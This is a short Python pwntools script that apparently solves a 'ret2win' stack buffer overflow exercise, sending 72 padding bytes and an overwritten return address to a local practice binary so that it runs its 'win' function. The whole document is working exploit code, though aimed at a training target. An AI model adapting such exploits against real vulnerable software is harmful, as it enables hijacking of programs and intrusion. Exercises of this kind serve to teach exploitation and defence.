from pwn import *

context.binary = ELF("stack-bof-ret2win")

p = process(["stack-bof-ret2win"])
payload = b"A" * 72 + p64(0x401271) # we can also write context.binary.sym.win
p.sendafter(b"payload?\n", payload)
print(p.recvall().decode().strip())
